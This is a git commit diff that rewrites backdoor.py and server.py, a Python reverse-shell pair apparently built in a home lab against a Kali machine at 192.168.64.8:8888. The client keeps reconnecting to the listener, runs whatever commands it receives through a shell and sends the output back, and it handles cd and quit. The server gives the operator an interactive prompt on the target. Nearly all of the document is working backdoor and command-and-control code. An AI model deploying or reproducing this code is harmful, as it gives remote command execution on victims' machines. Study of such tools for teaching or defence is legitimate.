578f8bdd068d414a73ecba235a38e5ddeb734fd6
Truc Tran <tracytrle@gmail.com>
2024-03-13 20:52:52 -0500

    worked with some cmmd

--- backdoor.py
+++ backdoor.py
@@ -1,39 +1,56 @@
 import socket
-import subprocess
+import json
 import time
+import subprocess
+import os
 
-REMOTE_HOST = '192.168.64.8'
-REMOTE_PORT = 8888
-
-
-def thread_creation():
-  while True:
-    time.sleep(25)
-    try: 
-      client.connect((REMOTE_HOST, REMOTE_PORT))
-      start_command()
-      client.close()
-    except:
-      thread_creation()
+SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
+SERVER_PORT = 8888
 
 
-def start_command():
-  while True:
-    print("[-] Awaiting commands...")
-    command = client.recv(1024)
-    command = command.decode()
-    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-    output = op.stdout.read()
-    output_error = op.stderr.read()
-    print("[-] Sending response...")
-    client.send(output + output_error)
+def reliable_send(data):
+    json_data = json.dumps(data)
+    target_sock.send(json_data.encode())
 
 
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target_sock.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client = socket.socket()
-print("[-] Litening connection...")
-client.connect((REMOTE_HOST, REMOTE_PORT))
-print("[-] Connection initiated!")
-thread_creation()
 
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            target_sock.connect((SERVER_IP, SERVER_PORT))
+            shell()
+            target_sock.close()
+            break
+        except:
+            connection()
+
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            os.chdir(command[3:])
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
+
+
+target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection()
--- server.py
+++ server.py
@@ -1,25 +1,48 @@
+import os
 import socket
+import json
 
-HOST = '192.168.64.8'
-PORT = 8888
+SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
+SERVER_PORT = 8888
+
+
+def reliable_send(data):
+    json_data = json.dumps(data)
+    target_sock.send(json_data.encode())
+
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target_sock.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
 
 
 
-def communication():
-  while True:
-      command = input('Enter Command : ')
-      command = command.encode()
-      client.send(command)
-      print('[+] Command sent')
-      output = client.recv(1024)
-      output = output.decode()
-      print(f"Output: {output}")
+def target_communication():
+    while True:
+        command = input(f'* Shell~{str(target_ip)}: ')
+        reliable_send(command)
+        if command == 'quit':
+            break
+        elif command[:3] == 'cd ':
+            pass
+        elif command == 'clear':
+            os.system('clear')
+        else:
+            result = reliable_recv()
+            print(result)
 
-server = socket.socket()
-server.bind((HOST, PORT))
-print('[+] Server Started')
-print('[+] Listening For Client Connection ...')
-server.listen(1)
-client, client_addr = server.accept()
-print(f'[+] {client_addr} Client connected to the server')
-communication()
+
+server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_sock.bind((SERVER_IP, SERVER_PORT))
+
+print('[+] Listening For Incoming Connections')
+server_sock.listen(5)
+target_sock, target_ip = server_sock.accept()
+print(f'[+] Target Connected From: {str(target_ip)}')
+
+target_communication()
